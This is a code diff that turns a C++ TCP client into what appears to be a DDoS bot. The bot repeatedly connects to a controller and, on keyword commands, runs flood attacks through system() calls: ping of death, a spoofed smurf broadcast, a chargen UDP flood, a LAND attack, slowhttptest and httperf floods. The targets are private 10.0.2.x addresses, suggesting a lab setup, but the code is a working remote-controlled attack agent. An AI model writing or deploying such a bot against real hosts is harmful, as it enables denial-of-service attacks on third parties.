@@ -3,6 +3,7 @@
 #include <string.h>
 #include <sys/socket.h>
 #include <unistd.h>
+#include <stdlib.h>
 
 using namespace std;
 
@@ -23,12 +24,38 @@ int main()
 
 	start:
 	while(connect(sock, (struct sockaddr *) &server_address, sizeof(server_address)) != 0) {
-		sleep(10);
+		sleep(5);
 		goto start;
 	}
 
 	send(sock, hello, strlen(hello), 0);
 	cout << "Hello message sent\n";
-	valread = read(sock, buffer, 1024);
-	cout << buffer << "\n";
+
+	while (true) 
+	{
+		// bzero(&buffer, sizeof(buffer));
+		recv(sock, buffer, 1024, 0);
+		// valread = read(sock, buffer, 1024);
+		if (strncmp("POD", buffer, 3) == 0) 
+		{
+			system("ping 10.0.2.15 -s 65000 -i 0.0000001");
+		} else if (strncmp("SMURF", buffer, 5) == 0)
+		{
+			system("hping3 10.0.2.255 -a 10.0.2.15 --icmp -C 8 -D --flood");
+		} else if (strncmp("CHARGEN", buffer, 7) == 0)
+		{
+			system("hping3 10.0.2.5 -a 10.0.2.15 -p 19 --udp -D --flood");
+		} else if (strncmp("LAND", buffer, 4) == 0)
+		{	system("for i in {1..100000}; do hping3 10.0.2.15 -a 10.0.2.15 -p 7 -s 7 -S -c 1 -D --flood; sleep 0.00000000000001; done;");
+			
+		} else if (strncmp("SLOWHTTP", buffer, 8) == 0)
+		{
+			system("slowhttptest -H -u http://10.0.2.15 -t GET -c 500 -r 30 -p 20 -l 3600");
+		} else if (strncmp("FASTHTTP", buffer, 8) == 0)
+		{
+			system("httperf --server 10.0.2.15 --uri / --num-conns 100000 --rate 500");
+		}
+	}	
+	close(sock);
+	exit(0);
 }
